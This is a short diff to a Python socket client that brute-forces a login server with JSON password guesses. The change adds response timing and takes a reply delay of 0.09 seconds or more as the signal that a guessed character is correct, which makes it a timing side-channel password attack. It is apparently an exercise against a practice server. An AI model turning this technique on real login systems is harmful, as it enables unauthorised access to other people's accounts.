@@ -1,6 +1,7 @@
 import socket
 import sys
 import string
+from time import perf_counter
 import json
 from itertools import product
 
@@ -52,8 +53,11 @@ class Socket:
             password_guess += letter
             message_to_json = json.dumps({"login": login, "password": password_guess})
             self.sock.send(message_to_json.encode())
+            t1_start = perf_counter()
             message_from_json = json.loads(self.receive().decode('utf-8'))
-            if message_from_json["result"] == "Exception happened during login":
+            t1_stop = perf_counter()
+            time_delay = t1_stop - t1_start
+            if time_delay >= 0.09:
                 generator = iter(letters_digits)
             elif message_from_json["result"] == "Wrong password!":
                 password_guess = password_guess[:-1]
